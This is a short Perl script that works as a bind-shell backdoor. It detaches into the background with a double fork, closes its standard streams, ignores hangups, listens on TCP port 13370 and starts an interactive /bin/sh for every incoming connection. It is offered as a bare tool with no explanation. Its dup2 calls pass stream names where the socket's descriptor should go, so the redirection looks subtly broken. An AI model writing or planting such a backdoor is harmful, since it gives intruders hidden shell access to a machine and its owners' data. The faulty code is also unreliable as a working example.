#!/usr/bin/perl
use strict;
use Socket;
use POSIX;

my $port = 13370;
my $host = "localhost";
my $protocol = "tcp";

if ( $port =~ /\D/) {
	$port = getservbyname($port, $protocol) || die "getservbyname ${port}/$protocol\n";
}
my $inet_address = inet_aton($host) || die "inet_aton: ${host}\n";
my $port_address = sockaddr_in($port, $inet_address);
my $protocol_num = getprotobyname($protocol);
my $pid;
$| = 1;

socket(SOCKET, AF_INET, SOCK_STREAM, $protocol_num) || die "socket: $!";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR,1) || die "setsockopt: $!\n";
bind(SOCKET, $port_address) || die "bind: $!\n";

defined($pid = fork) or die "fork: $!";
exit if $pid;
setsid or die "session: $!";

close(STDIN);
close(STDOUT);
close(STDERR);
setpgrp();
$SIG{HUP} = "IGNORE";

defined($pid = fork) or die "fork: $!";
exit if $pid;
setsid or die "session: $!";

my $lsock = listen(SOCKET, 5) || die "listen $!\n";

while (1) {
	my $shell_shock=accept(NEWSOCKET, SOCKET)|| die "accept $!\n";
	dup2("STDIN",0);
	dup2("STDOUT",1);
	dup2("STDERR",2);
	system("/bin/sh -i");
	close($shell_shock);
}
close(SOCKET);
exit;
